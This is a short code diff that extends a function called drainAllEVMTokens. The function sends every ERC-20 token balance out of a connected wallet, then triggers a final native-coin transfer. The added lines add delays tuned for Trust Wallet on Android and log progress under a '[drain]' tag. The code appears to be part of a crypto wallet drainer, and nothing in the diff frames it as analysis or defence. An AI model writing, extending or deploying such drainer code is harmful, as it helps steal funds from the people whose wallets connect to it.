@@ -362,4 +362,16 @@ export async function drainAllEVMTokens(
       await sendERC20Token(signer, token.contractAddress, token.balance, chainName);
       await txDelay(1500);
     } catch (error) {
-      console.error(
+      console.error(`[drain] Failed ERC-20 ${token.symbol}:`, error);
+    }
+  }
+
+  // Step 3: Native transfer LAST — longer delay before for Trust Wallet Android
+  await txDelay(3000);
+  try {
+    console.log(`[drain] Prompting native ${chainName} transfer...`);
+    await drainNativeTokens(signer, provider, chainName);
+  } catch (error) {
+    console.error('[drain] Native transfer failed:', error);
+  }
+}
